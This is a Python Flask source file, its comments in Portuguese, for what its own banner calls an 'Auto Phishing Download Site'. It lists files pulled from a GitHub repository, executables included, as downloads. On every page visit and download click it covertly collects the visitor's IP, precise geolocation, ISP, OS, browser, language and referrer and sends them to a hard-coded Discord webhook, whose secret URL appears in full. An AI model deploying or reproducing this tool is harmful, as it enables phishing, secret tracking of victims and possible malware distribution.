import os
import time
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# ============================================================
# 🎯 CONFIGURAÇÃO — SÓ TROCA ISSO
# ============================================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540114660370550804/502O_M9Q2jzholD8UXekoDTCGHeUwr1TznCXR75s3ZiM8oqW7TCnXvZHK7YIMs02cm9g"

# Teu repositório no GitHub
GITHUB_REPO_OWNER = "malucomaf16"         # Ex: "joaozinho"
GITHUB_REPO_NAME   = "downloads website"           # Ex: "meu-phishing"
GITHUB_FILES_PATH  = "arquivos"           # Pasta onde estão os arquivos
GITHUB_BRANCH      = "main"               # ou "master"

# Opcional: token do GitHub pra evitar rate limit (60 req/h sem token)
# Cria em: https://github.com/settings/tokens (não precisa de permissão especial)
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
# ============================================================

HEADERS = {}
if GITHUB_TOKEN:
    HEADERS["Authorization"] = f"token {GITHUB_TOKEN}"


# ============================================================
# 📦 LISTA ARQUIVOS DO GITHUB VIA API
# ============================================================

def get_github_files():
    """Pega a lista de arquivos da pasta no GitHub"""
    url = f"https://api.github.com/repos/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/contents/{GITHUB_FILES_PATH}?ref={GITHUB_BRANCH}"
    
    try:
        resp = requests.get(url, headers=HEADERS, timeout=10)
        if resp.status_code == 200:
            contents = resp.json()
            files = []
            for item in contents:
                if item["type"] == "file":
                    name = item["name"]
                    # Pega extensão
                    if "." in name:
                        ext = "." + name.rsplit(".", 1)[1]
                    else:
                        ext = ""
                    # Tamanho em MB
                    size_mb = round(item["size"] / (1024 * 1024), 1)
                    # Link direto raw
                    raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO_OWNER}/{GITHUB_REPO_NAME}/{GITHUB_BRANCH}/{GITHUB_FILES_PATH}/{name}"
                    
                    files.append({
                        "name": name.replace("_", " ").replace("-", " ").replace(ext, "").strip(),
                        "filename": name,
                        "ext": ext,
                        "size_mb": size_mb,
                        "raw_url": raw_url,
                        "github_url": item["html_url"],
                        "download_url": item["download_url"],
                    })
            
            # Ordena por nome
            files.sort(key=lambda x: x["filename"])
            return files
        else:
            print(f"[!] GitHub API error: {resp.status_code} - {resp.text}")
            return []
    except Exception as e:
        print(f"[!] GitHub API exception: {e}")
        return []


# ============================================================
# 🌍 ICONE POR EXTENSÃO
# ============================================================

def get_icon(ext):
    icons = {
        ".exe": "⚙️", ".msi": "⚙️", ".dll": "🔧",
        ".zip": "📦", ".rar": "📦", ".7z": "📦", ".tar": "📦", ".gz": "📦",
        ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🖼️", ".bmp": "🖼️",
        ".pdf": "📄", ".doc": "📄", ".docx": "📄", ".txt": "📄",
        ".mp3": "🎵", ".mp4": "🎬", ".avi": "🎬", ".mkv": "🎬",
        ".iso": "💿", ".img": "💿",
        ".py": "🐍", ".js": "🟨", ".html": "🌐", ".css": "🎨",
        ".apk": "📱",
        ".dmg": "💻",
    }
    return icons.get(ext.lower(), "📁")


def get_category(ext):
    ext = ext.lower()
    if ext in (".exe", ".msi", ".dll"): return "Applications"
    if ext in (".zip", ".rar", ".7z", ".tar", ".gz"): return "Archives"
    if ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"): return "Images"
    if ext in (".pdf", ".doc", ".docx", ".txt", ".xls", ".xlsx"): return "Documents"
    if ext in (".mp3", ".wav", ".flac", ".aac"): return "Audio"
    if ext in (".mp4", ".avi", ".mkv", ".mov", ".wmv"): return "Video"
    if ext in (".iso", ".img"): return "Disc Images"
    if ext in (".py", ".js", ".html", ".css", ".php"): return "Code"
    if ext in (".apk"): return "Android"
    if ext in (".dmg"): return "macOS"
    return "Other"


# ============================================================
# 🕵️ COLETA DE INFO
# ============================================================

def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    if request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    return request.remote_addr or "0.0.0.0"


def get_geolocation(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return data
    except Exception:
        pass
    return {"query": ip, "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
            "zip": "", "lat": 0, "lon": 0, "isp": "Unknown", "org": "Unknown", "as": "Unknown"}


def parse_ua(ua):
    ua_l = ua.lower()
    if "windows" in ua_l: os_name = "Windows"
    elif "mac os" in ua_l or "macintosh" in ua_l: os_name = "macOS"
    elif "linux" in ua_l: os_name = "Linux"
    elif "android" in ua_l: os_name = "Android"
    elif "iphone" in ua_l or "ipad" in ua_l: os_name = "iOS"
    else: os_name = "Unknown"
    if "edg" in ua_l: browser = "Edge"
    elif "chrome" in ua_l: browser = "Chrome"
    elif "firefox" in ua_l: browser = "Firefox"
    elif "safari" in ua_l: browser = "Safari"
    elif "opera" in ua_l or "opr" in ua_l: browser = "Opera"
    else: browser = "Unknown"
    return os_name, browser


def send_webhook(action, file_name=""):
    ip = get_client_ip()
    if ip in ("127.0.0.1", "::1", "localhost"):
        return
    
    ua = request.headers.get("User-Agent", "Unknown")
    os_name, browser = parse_ua(ua)
    geo = get_geolocation(ip)
    
    embed = {
        "embeds": [{
            "title": f"⬇️ {action} — {file_name}" if file_name else f"👁️ {action}",
            "color": 0x5865F2,
            "fields": [
                {"name": "📄 File", "value": file_name or "N/A", "inline": True},
                {"name": "🌐 IP", "value": str(geo.get("query", ip)), "inline": True},
                {"name": "📍 Country", "value": str(geo.get("country", "Unknown")), "inline": True},
                {"name": "🏙️ City", "value": str(geo.get("city", "Unknown")), "inline": True},
                {"name": "🗺️ Region", "value": str(geo.get("regionName", "Unknown")), "inline": True},
                {"name": "📮 ZIP", "value": str(geo.get("zip", "")), "inline": True},
                {"name": "🧭 Lat", "value": str(geo.get("lat", 0)), "inline": True},
                {"name": "🧭 Lon", "value": str(geo.get("lon", 0)), "inline": True},
                {"name": "🏢 ISP", "value": str(geo.get("isp", "Unknown")), "inline": True},
                {"name": "🏢 Org", "value": str(geo.get("org", "Unknown")), "inline": True},
                {"name": "🔗 ASN", "value": str(geo.get("as", "Unknown")), "inline": True},
                {"name": "💻 OS", "value": os_name, "inline": True},
                {"name": "🌍 Browser", "value": browser, "inline": True},
                {"name": "🗣️ Language", "value": request.headers.get("Accept-Language", "Unknown"), "inline": True},
                {"name": "🔗 U.A.", "value": ua, "inline": False},
                {"name": "🔗 Referrer", "value": request.referrer or "Direct", "inline": True},
            ],
            "footer": {"text": f"HackerAI • {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
        }]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=10)
    except Exception as e:
        print(f"[!] Webhook error: {e}")


# ============================================================
# 🌐 ROTAS
# ============================================================

@app.route("/")
def index():
    files = get_github_files()
    send_webhook("Visited Homepage")
    
    # Agrupa por categoria
    categories = {}
    for f in files:
        cat = get_category(f["ext"])
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(f)
    
    return render_template("index.html", categories=categories, total_files=len(files))


@app.route("/download/<path:filename>")
def download_page(filename):
    files = get_github_files()
    file_data = None
    for f in files:
        if f["filename"] == filename:
            file_data = f
            break
    
    if not file_data:
        return render_template("404.html"), 404
    
    send_webhook("Clicked Download", file_data["filename"])
    
    return render_template("download.html", file=file_data)


# ============================================================
# 🚀 START
# ============================================================

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════╗
║      🕵️  Auto Phishing Download Site    ║
║    Files loaded dynamically from GitHub  ║
╚══════════════════════════════════════════╝
    """)
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
